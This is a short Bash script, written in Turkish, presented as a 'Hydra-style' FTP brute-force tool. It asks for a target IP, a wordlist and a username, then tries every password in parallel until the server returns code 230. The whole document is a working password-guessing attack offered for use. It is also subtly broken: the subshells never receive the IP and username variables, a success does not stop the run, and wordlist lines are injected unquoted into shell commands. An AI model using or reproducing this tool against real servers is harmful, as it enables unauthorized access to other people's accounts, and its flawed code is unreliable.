#!/bin/bash

# Renk tanımları
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}Selam dostlar, Hydra tarzı FTP brute force aracıma hoş geldiniz!${NC}"

# Kullanıcıdan bilgileri al
read -p "Lütfen brute forc yapılacak IP adresini gir: " ip
read -p "Kelime dosyasının yolunu gir >> " word
read -p "Kullanıcı adını gir >> " user

# Kullanıcı adı ve kelime dosyasının kontrolü
if [[ -z "$user" || ! -f "$word" ]]; then
    echo -e "${RED}Kullanıcı adı veya şifre dosyası bulunamadı! Lütfen tekrar deneyiniz.${NC}"
    exit 1
fi

# FTP bağlantısını ve başarılı giriş kontrolünü yapan bir fonksiyon
bruteforce_ftp() {
    password=$1
    result=$(ftp -n -v $ip <<EOF
open $ip
user $user $password
bye
EOF
)
    if echo "$result" | grep -q "230"; then
        echo -e "${GREEN}Başarılı giriş! Kullanıcı: $user, Parola: $password${NC}"
        exit 0
    fi
}

export -f bruteforce_ftp  # Paralel işlem fonksiyonunu export et

# Brute force saldırısını başlat
echo -e "${GREEN}Brute force saldırısı başlatılıyor...${NC}"
cat "$word" | xargs -I {} -P 10 bash -c "bruteforce_ftp {}"

echo -e "${RED}Brute force saldırısı tamamlandı. Başarılı giriş bulunamadı.${NC}"
